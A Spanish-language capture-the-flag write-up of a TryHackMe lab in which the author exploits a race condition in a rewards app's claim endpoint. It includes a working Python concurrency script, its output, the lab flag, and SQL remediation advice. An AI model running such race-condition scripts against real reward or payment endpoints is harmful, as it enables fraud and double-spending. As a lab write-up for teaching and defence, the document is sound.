---
title: "Towel on the Sunbed — TryHackMe Writeup"
event: "Hacker Holidays 2026"
difficulty: "Medium"
category: [CTF, TryHackMe]
tags: [race-condition, toctou, web-security, tryhackme, ctf]
---

# Towel on the Sunbed — TryHackMe Writeup

**Evento:** Hacker Holidays 2026
**Categoría:** Web
**Dificultad:** Medium
**Objetivo:** `http://10.65.128.126:3000`

## Resumen

*Ponzi — Wellness Rewards* es una aplicación de recompensas cripto ("poolside edition") que permite a los usuarios reclamar **50 PONZI** cada 24 horas. Al alcanzar **150 PONZI**, un usuario obtiene el estatus *Whale* y acceso a la **Whale Vault**, donde se encuentra la flag.

La vulnerabilidad reside en el endpoint `POST /claim`: el servidor valida el cooldown de 24 horas y acredita el balance en dos pasos no atómicos, lo que permite explotar una **condición de carrera (Race Condition / TOCTOU)** para reclamar la recompensa múltiples veces en la misma ventana de 24 horas.

## Reconocimiento

Al acceder a la aplicación, se encuentra un flujo estándar de autenticación:

- `GET /auth/login`
- `GET /auth/register`

Revisando el código fuente (`Ctrl+U`) y los scripts cargados (`/js/auth.js`, `/js/dashboard.js`), se identifica la lógica del cliente:

- El registro y login envían JSON vía `fetch()` a `/auth/register` y `/auth/login`.
- El dashboard consulta `GET /dashboard/api/me` para obtener balance, tier y estado del cooldown (`canClaim`, `secondsUntilClaim`).
- El botón **Claim Reward** dispara `POST /claim` sin body ni parámetros, autenticado únicamente por cookie de sesión (`connect.sid`).
- El botón **Open Vault** dispara `GET /vault`, habilitado solo cuando `balance >= 150`.

```javascript
const WHALE_THRESHOLD = 150;
...
document.getElementById('claim-btn').addEventListener('click', async () => {
    const resp = await fetch('/claim', { method: 'POST' });
    ...
});
```

Esta lógica de negocio —verificar el cooldown y luego acreditar el balance— es el candidato natural para una condición de carrera, reforzado por las pistas del propio briefing del reto:

> *"Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through."*
> *"bro really thinks the clock is the only thing checking him"*

## Vulnerabilidad: Race Condition (TOCTOU) en `/claim`

El flujo esperado en el servidor es, aproximadamente:

1. **Check:** consultar si `lastClaimTime` del usuario tiene más de 24h.
2. **Use:** si es válido, sumar 50 PONZI al balance y actualizar `lastClaimTime`.

Cuando estos dos pasos no se ejecutan como una operación atómica (por ejemplo, sin una transacción con lock, o sin una actualización condicional tipo `findOneAndUpdate` / `UPDATE ... WHERE lastClaim < NOW() - 24h`), múltiples peticiones concurrentes pueden pasar la verificación del paso 1 **antes** de que cualquiera de ellas alcance a escribir el resultado del paso 2.

Esto abre una ventana de tiempo (por milisegundos que sea) en la que el servidor puede procesar N peticiones como válidas simultáneamente, en lugar de solo una.

## Explotación

### 1. Preparar una cuenta "limpia"

Es fundamental usar una cuenta que **nunca haya reclamado manualmente**, ya que un solo clic consume el claim de forma serial y no dispara la condición de carrera. Se registró una cuenta nueva (`test2`) y se capturó la cookie de sesión (`connect.sid`) sin interactuar con el botón de claim.

### 2. Disparar peticiones concurrentes

Se utilizó Python con `asyncio` + `aiohttp` para enviar múltiples peticiones `POST /claim` **verdaderamente concurrentes** (no secuenciales), autenticadas con la cookie de sesión robada del navegador:

```python
import asyncio
import aiohttp

TARGET = "http://10.65.128.126:3000"
COOKIES = {
    "connect.sid": "s%3A...tu_cookie_de_sesion..."
}

N_REQUESTS = 30

async def claim(session, i):
    async with session.post(f"{TARGET}/claim") as resp:
        status = resp.status
        try:
            data = await resp.json()
        except Exception:
            data = await resp.text()
        print(f"[{i}] status={status} -> {data}")

async def main():
    async with aiohttp.ClientSession(cookies=COOKIES) as session:
        tasks = [claim(session, i) for i in range(N_REQUESTS)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

### 3. Resultado

De las 30 peticiones enviadas simultáneamente, varias lograron "ganar la carrera" antes de que el servidor registrara el primer claim exitoso:

```
[7]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300,  'tier': 'Whale', 'priceSnapshot': 4.2}
[4]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300,  'tier': 'Whale', 'priceSnapshot': 4.2}
[9]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300,  'tier': 'Whale', 'priceSnapshot': 4.2}
[2]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300,  'tier': 'Whale', 'priceSnapshot': 4.2}
[8]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300,  'tier': 'Whale', 'priceSnapshot': 4.2}
[3]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 400,  'tier': 'Whale', 'priceSnapshot': 4.2}
[11] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450,  'tier': 'Whale', 'priceSnapshot': 4.2}
[13] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450,  'tier': 'Whale', 'priceSnapshot': 4.2}
[22] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450,  'tier': 'Whale', 'priceSnapshot': 4.2}
...
[12] status=429 -> {'error': 'Reward already claimed. Please wait before claiming again.', 'secondsRemaining': 86400}
```

El resto de las peticiones recibió `429 Too Many Requests`, indicando que en algún punto el servidor sí aplicó el bloqueo — pero para entonces ya era demasiado tarde: el balance final quedó en **450 PONZI**, muy por encima del umbral de 150 necesario para el tier *Whale*.

## Obtener la flag

Con el balance por encima de 150 PONZI, el botón **Open Vault** queda habilitado. Se puede acceder tanto desde el navegador como directamente vía `curl`:

```bash
curl -s http://10.65.128.126:3000/vault \
  -H "Cookie: connect.sid=<tu_cookie_de_sesion>"
```

**Respuesta:**

```json
{
  "message": "Welcome to the Whale Vault.",
  "flag": "THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}",
  "balance": 450
}
```

🚩 **Flag:** `THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}`

## Causa raíz

El bug es un clásico **TOCTOU (Time-Of-Check to Time-Of-Use)**, también conocido en el mundo financiero como **double-spend**. Ocurre cuando:

- La verificación de una condición de negocio (¿puede reclamar?) y
- La actualización del estado que depende de esa condición (marcar como reclamado + acreditar saldo)

se realizan como **dos operaciones separadas y no atómicas**, dejando una ventana en la que múltiples hilos/procesos concurrentes pueden leer el mismo estado "válido" antes de que ninguno de ellos lo invalide para los demás.

Este mismo patrón de vulnerabilidad ha afectado a sistemas reales de bancos, exchanges de criptomonedas y programas de fidelización, con impacto financiero directo.

## Remediación

- **Operaciones atómicas a nivel de base de datos:** usar actualizaciones condicionales atómicas, por ejemplo en SQL:
  ```sql
  UPDATE users
  SET balance = balance + 50, last_claim = NOW()
  WHERE id = :userId AND last_claim <= NOW() - INTERVAL '24 hours';
  ```
  Solo se aplica el `UPDATE` si la condición del `WHERE` sigue siendo verdadera en el momento exacto de la escritura, eliminando la ventana de carrera.

- **Locks explícitos:** usar `SELECT ... FOR UPDATE` (SQL) o mecanismos de lock a nivel de fila/documento antes de leer y escribir el estado.

- **Idempotencia / locking a nivel de aplicación:** emplear un lock distribuido (ej. Redis `SETNX` con expiración) por usuario para serializar las peticiones concurrentes al mismo endpoint sensible.

- **Rate limiting complementario:** aunque no sustituye la corrección de la lógica atómica, limitar la tasa de peticiones por usuario/IP reduce la superficie de explotación.

## Conclusión

Este reto es un buen recordatorio de que los controles de tiempo (cooldowns, timers, límites diarios) **no son suficientes por sí solos** si la lógica de verificación y actualización no está protegida por operaciones atómicas. Un atacante no necesita "engañar al reloj" — solo necesita llegar antes de que el servidor termine de escribir.

---
*Writeup por Cristhian — Hacker Holidays 2026, TryHackMe.*
